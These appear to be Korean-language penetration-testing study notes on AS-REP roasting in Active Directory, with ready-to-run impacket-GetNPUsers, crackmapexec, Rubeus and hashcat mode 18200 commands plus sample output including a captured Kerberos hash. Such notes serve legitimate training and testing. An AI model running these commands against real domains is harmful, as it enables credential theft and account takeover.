커버로스 인증 첫 단계인 AS-REQ는 preauthentication이 없으면 공격자는 모든 AD 사용자를 대신하여 DC에 AS-REQ를 전송 가능함.

AS-REP로 들어오는 응답은 hashcat으로 크랙 가능(**18200**)
### AS-REP Crack (hashcat)
```bash
hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```


AS-REP 로스팅은
→ impacket-GetNPUsers (kali)
→ crackmapexec (kali)
→ Rubeus.exe (win) - **사전인증 필요**
를 사용하여 할 수 있다.

### impacket-GetNPUsers
```powershell
impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast corp.com/pete
#Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
#
#Password:
#Name  MemberOf  PasswordLastSet             LastLogon                   UAC      
#----  --------  --------------------------  --------------------------  --------
#dave            2022-09-02 19:21:17.285464  2022-09-07 12:45:15.559299  0x410200 
```

### impacket-GetNPUsers (BruteForce)
```python
impacket-GetNPUsers -dc-ip 10.10.158.152 oscp.exam/ -usersfile users.txt
```

### crackmapexec
```powershell
cme ldap 192.168.40.150 -u low -p 'Password123!' --asreproast roast.txt
```

### Rubeus.exe (사전 인증 필요)
```powershell
.\\Rubeus.exe asreproast /nowrap

#...
#$krb5asrep$dave@corp.com:AE43CA9011CC7E7B9E7F7E7279DD7F2E$7D4C59410DE2984EDF35053B7954E6DC9A0D16CB5BE8E9DCACCA88C3C13C4031ABD71DA16F476EB972506B4989E9ABA2899C042E66792F33B119FAB1837D94EB654883C6C3F2DB6D4A8D44A8D9531C2661BDA4DD231FA985D7003E91F804ECF5FFC0743333959470341032B146AB1DC9BD6B5E3F1C41BB02436D7181727D0C6444D250E255B7261370BC8D4D418C242ABAE9A83C8908387A12D91B40B39848222F72C61DED5349D984FFC6D2A06A3A5BC19DDFF8A17EF5A22162BAADE9CA8E48DD2E87BB7A7AE0DBFE225D1E4A778408B4933A254C30460E4190C02588FBADED757AA87A
```


